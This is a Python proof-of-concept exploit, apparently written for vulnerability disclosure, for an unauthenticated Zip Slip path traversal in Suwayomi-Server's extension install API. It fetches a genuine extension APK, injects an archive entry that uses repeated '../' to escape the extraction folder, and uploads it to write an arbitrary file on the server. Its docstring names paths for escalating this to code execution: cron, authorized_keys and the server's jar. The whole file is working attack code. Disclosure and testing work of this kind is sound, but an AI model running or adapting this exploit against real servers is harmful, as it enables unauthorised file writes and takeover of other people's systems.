#!/usr/bin/env python3
"""
PoC: Unauthenticated arbitrary file write (Zip Slip) in Suwayomi-Server via extension install.
CWE-22 Path Traversal (Zip Slip) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical)
Researcher: Kashish Topiwala
Affected: POST /api/v1/extension/install
          server/.../manga/impl/extension/Extension.kt (extractAssetsFromApk)

AUTHORIZED TESTING ONLY. Run only against a Suwayomi instance you own.

Root cause: during extension install the server extracts every APK zip entry whose name
starts with "assets/" to <extensionsRoot>/<name>_assets/<entry name> with no path
normalization and no containment check. An entry named "assets/../../.../<abs path>"
satisfies the only guard (startsWith "assets/") and the "../" sequence escapes the
extraction folder, writing an attacker-controlled file anywhere the server can write.
This escalates to RCE (startup script, cron, authorized_keys, overwriting the loaded jar).

This script needs a valid Tachiyomi/Mihon extension APK (real classes.dex + manifest,
versionName major.minor in 1.3-1.6) as a base so the install passes parsing/dex2jar; it
downloads one automatically unless --base is given. It repackages the APK (dropping the
APK signing block so Java's ZipInputStream reaches the injected entry) with:
  - a benign "assets/keep.txt" entry FIRST, so the literal "assets/" directory exists
    (Linux must be able to walk "assets/.." at open time), and
  - the traversal entry that writes the payload to --dest.
"""
import argparse, io, os, sys, urllib.request, zipfile

BASE_APK_URL = ("https://raw.githubusercontent.com/overtunned/tachiyomi-extensions-apk/"
                "main/apk/tachiyomi-all.buondua-revived-v1.4.2.apk")

def fetch(url):
    with urllib.request.urlopen(url, timeout=90) as r:
        return r.read()

def build_evil(base_bytes, dest, payload, updown=12):
    evil = "assets/" + "../" * updown + dest.lstrip("/")
    buf = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(base_bytes)) as zin, zipfile.ZipFile(buf, "w") as zout:
        for it in zin.infolist():                       # full repackage: no signing block
            zout.writestr(it, zin.read(it.filename), it.compress_type)
        zout.writestr(zipfile.ZipInfo("assets/keep.txt"), b"keep\n", zipfile.ZIP_STORED)
        zout.writestr(zipfile.ZipInfo(evil), payload, zipfile.ZIP_STORED)
    return buf.getvalue(), evil

def multipart(field, filename, data, ctype="application/vnd.android.package-archive"):
    b = "----pocboundary"
    pre = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
           "Content-Type: %s\r\n\r\n" % (b, field, filename, ctype)).encode()
    post = ("\r\n--%s--\r\n" % b).encode()
    return b"".join([pre, data, post]), b

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://localhost:4567", help="Suwayomi base URL")
    ap.add_argument("--base", help="path to a valid extension APK (else downloaded)")
    ap.add_argument("--dest", default="/tmp/suwa_pwned_zipslip", help="absolute path to write on the server")
    ap.add_argument("--payload", default="ZIPSLIP-WRITE-PoC-Kashish-Topiwala\n")
    ap.add_argument("--apk-filename", default="tachiyomi-all.buondua-revived-v1.4.2.apk")
    a = ap.parse_args()
    B = a.url.rstrip("/")

    base = open(a.base, "rb").read() if a.base else fetch(BASE_APK_URL)
    print("[*] base extension APK: %d bytes" % len(base))
    evil, entry = build_evil(base, a.dest, a.payload.encode())
    print("[*] injected traversal entry: %s" % entry)

    body, boundary = multipart("file", a.apk_filename, evil)
    req = urllib.request.Request("%s/api/v1/extension/install" % B, data=body, method="POST",
                                 headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary})
    print("[*] Step 1 (unauth): POST /api/v1/extension/install  (%d bytes)" % len(body))
    try:
        resp = urllib.request.urlopen(req, timeout=120)
        print("    install ->", resp.status)
    except urllib.error.HTTPError as e:
        print("    install ->", e.code, e.read()[:200].decode("utf-8", "replace"))

    print("[*] Step 2: verify the file was written on the server host:")
    print("      docker exec <suwayomi-container> cat %s" % a.dest)
    print("    Expected contents: %r" % a.payload)
    print("\n[INFO] If %s contains the payload, unauthenticated arbitrary file write is confirmed." % a.dest)

if __name__ == "__main__":
    main()
